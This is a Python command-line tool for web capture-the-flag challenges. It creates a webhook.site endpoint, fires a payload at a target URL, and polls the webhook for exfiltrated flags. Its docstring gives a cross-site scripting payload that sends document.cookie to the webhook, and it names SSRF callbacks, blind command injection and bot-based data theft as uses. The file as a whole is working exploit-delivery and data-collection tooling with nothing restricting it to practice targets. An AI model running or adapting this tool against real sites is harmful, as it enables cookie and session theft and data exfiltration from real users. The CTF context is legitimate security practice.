#!/usr/bin/env python3
"""Out-of-band (OOB) webhook callback helper for web CTF challenges.

Creates a temporary webhook endpoint using webhook.site, then returns
the URL and UUID so exploit scripts can use it for XSS exfiltration,
SSRF callbacks, blind command injection, or bot-based data theft.

After the exploit fires, polls the webhook for incoming requests and
searches them for flag patterns.

Usage:
    # Create webhook and get URL
    python3 auto_webhook_oob.py create

    # Poll for callbacks (after exploit has fired)
    python3 auto_webhook_oob.py poll --uuid <UUID> [--flag-format "flag\\{.*\\}"] [--timeout 30]

    # One-shot: create, run exploit command, poll for results
    python3 auto_webhook_oob.py exploit \
        --url "http://target:8080/submit" \
        --payload '<script>fetch("{{WEBHOOK}}/"+document.cookie)</script>' \
        [--method POST] [--data 'comment={{PAYLOAD}}'] \
        [--flag-format "flag\\{.*\\}"] [--timeout 60]

In exploit mode, {{WEBHOOK}} in --payload and --data is replaced with
the webhook URL. {{PAYLOAD}} in --data is replaced with the URL-encoded
payload.

Exit codes:
    0 -- flag found (printed to stdout as "EXTRACTED FLAG: <flag>")
    1 -- no flag found
    2 -- webhook.site unreachable or error
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_WEBHOOK_API = "https://webhook.site"
_DEFAULT_TIMEOUT = 60
_POLL_INTERVAL = 3

# Common CTF flag patterns
_FLAG_PATTERNS = [
    r"[A-Za-z0-9_]{2,20}\{[^\}]{4,200}\}",
    r"flag\{[^\}]+\}",
    r"FLAG\{[^\}]+\}",
    r"CTF\{[^\}]+\}",
]


def _create_webhook() -> tuple[str, str] | None:
    """Create a webhook.site token.  Returns (uuid, url) or None."""
    try:
        req = urllib.request.Request(
            f"{_WEBHOOK_API}/token",
            method="POST",
            headers={"Accept": "application/json"},
            data=b"",
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
            uuid = data["uuid"]
            url = f"{_WEBHOOK_API}/{uuid}"
            return uuid, url
    except (urllib.error.URLError, KeyError, json.JSONDecodeError) as e:
        print(f"[!] Failed to create webhook: {e}", file=sys.stderr)
        return None


def _poll_requests(uuid: str, timeout: float, flag_format: str) -> str | None:
    """Poll webhook.site for incoming requests.  Returns flag or None."""
    deadline = time.monotonic() + timeout
    seen_ids: set[str] = set()

    while time.monotonic() < deadline:
        try:
            req = urllib.request.Request(
                f"{_WEBHOOK_API}/token/{uuid}/requests?sorting=newest",
                headers={"Accept": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read())
        except (urllib.error.URLError, json.JSONDecodeError):
            time.sleep(_POLL_INTERVAL)
            continue

        requests = data.get("data", [])
        for r in requests:
            rid = r.get("uuid", "")
            if rid in seen_ids:
                continue
            seen_ids.add(rid)

            # Search all parts of the request for flags
            searchable = []
            searchable.append(r.get("url", ""))
            searchable.append(r.get("content", ""))
            searchable.append(r.get("query", ""))
            searchable.append(json.dumps(r.get("headers", {})))
            # URL-decode the path to catch encoded flags
            try:
                searchable.append(urllib.parse.unquote(r.get("url", "")))
            except Exception:
                pass

            combined = "\n".join(searchable)

            # Try user-supplied flag format first
            if flag_format:
                try:
                    m = re.search(flag_format, combined)
                    if m:
                        return m.group(0)
                except re.error:
                    pass

            # Try common patterns
            for pat in _FLAG_PATTERNS:
                m = re.search(pat, combined)
                if m:
                    return m.group(0)

            # Print request summary for debugging
            method = r.get("method", "?")
            url = r.get("url", "?")
            content = (r.get("content") or "")[:200]
            print(f"[webhook] {method} {url}")
            if content:
                print(f"  body: {content}")

        if not requests:
            remaining = deadline - time.monotonic()
            if remaining > 0:
                time.sleep(min(_POLL_INTERVAL, remaining))

    return None


def _run_exploit(
    target_url: str,
    payload: str,
    webhook_url: str,
    method: str = "GET",
    data_template: str = "",
    content_type: str = "",
) -> bool:
    """Fire the exploit with webhook URL injected.  Returns True on success."""
    # Replace {{WEBHOOK}} placeholder in payload
    payload_rendered = payload.replace("{{WEBHOOK}}", webhook_url)

    # Build request
    if method.upper() == "GET":
        # Inject payload into URL query parameter
        sep = "&" if "?" in target_url else "?"
        url = f"{target_url}{sep}payload={urllib.parse.quote(payload_rendered)}"
        req_data = None
    else:
        url = target_url
        if data_template:
            rendered_data = data_template.replace(
                "{{PAYLOAD}}", urllib.parse.quote(payload_rendered)
            ).replace("{{WEBHOOK}}", webhook_url)
            req_data = rendered_data.encode()
        else:
            req_data = payload_rendered.encode()

    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    elif req_data and not data_template:
        headers["Content-Type"] = "text/plain"
    elif data_template and "=" in data_template:
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    try:
        req = urllib.request.Request(url, data=req_data, method=method.upper(), headers=headers)
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode(errors="replace")[:2000]
            print(f"[exploit] {resp.status} -- {len(body)} bytes response")
            # Check response body for flag too
            return True
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")[:1000] if hasattr(e, "read") else ""
        print(f"[exploit] HTTP {e.code}: {body[:200]}", file=sys.stderr)
        return True  # server responded, exploit may have worked
    except urllib.error.URLError as e:
        print(f"[exploit] Connection error: {e}", file=sys.stderr)
        return False


def cmd_create(args: argparse.Namespace) -> int:
    result = _create_webhook()
    if result is None:
        return 2
    uuid, url = result
    print(f"WEBHOOK_UUID={uuid}")
    print(f"WEBHOOK_URL={url}")
    return 0


def cmd_poll(args: argparse.Namespace) -> int:
    flag = _poll_requests(args.uuid, args.timeout, args.flag_format or "")
    if flag:
        print(f"EXTRACTED FLAG: {flag}")
        return 0
    print("[!] No flag found in webhook callbacks", file=sys.stderr)
    return 1


def cmd_exploit(args: argparse.Namespace) -> int:
    # Step 1: create webhook
    result = _create_webhook()
    if result is None:
        return 2
    uuid, webhook_url = result
    print(f"[+] Webhook: {webhook_url}")

    # Step 2: fire exploit
    success = _run_exploit(
        target_url=args.url,
        payload=args.payload,
        webhook_url=webhook_url,
        method=args.method,
        data_template=args.data or "",
        content_type=args.content_type or "",
    )
    if not success:
        print("[!] Exploit delivery failed", file=sys.stderr)

    # Step 3: poll for callbacks
    print(f"[*] Polling webhook for {args.timeout}s...")
    flag = _poll_requests(uuid, args.timeout, args.flag_format or "")
    if flag:
        print(f"EXTRACTED FLAG: {flag}")
        return 0

    # Even if no flag in webhook, check if the exploit response itself had a flag
    print("[!] No flag captured via OOB callback", file=sys.stderr)
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(description="OOB webhook callback helper for web CTF challenges")
    sub = parser.add_subparsers(dest="command")

    # create
    sub.add_parser("create", help="Create a webhook endpoint")

    # poll
    poll_p = sub.add_parser("poll", help="Poll a webhook for callbacks")
    poll_p.add_argument("--uuid", required=True, help="Webhook UUID")
    poll_p.add_argument("--timeout", type=float, default=_DEFAULT_TIMEOUT)
    poll_p.add_argument("--flag-format", default="")

    # exploit
    exp_p = sub.add_parser("exploit", help="Create webhook, fire exploit, poll for flag")
    exp_p.add_argument("--url", required=True, help="Target URL to exploit")
    exp_p.add_argument("--payload", required=True, help="Exploit payload (use {{WEBHOOK}} placeholder)")
    exp_p.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    exp_p.add_argument("--data", default="", help="POST data template (use {{PAYLOAD}} and {{WEBHOOK}})")
    exp_p.add_argument("--content-type", default="", help="Content-Type header")
    exp_p.add_argument("--flag-format", default="")
    exp_p.add_argument("--timeout", type=float, default=_DEFAULT_TIMEOUT)

    args = parser.parse_args()

    if args.command == "create":
        return cmd_create(args)
    elif args.command == "poll":
        return cmd_poll(args)
    elif args.command == "exploit":
        return cmd_exploit(args)
    else:
        parser.print_help()
        return 1


if __name__ == "__main__":
    sys.exit(main())
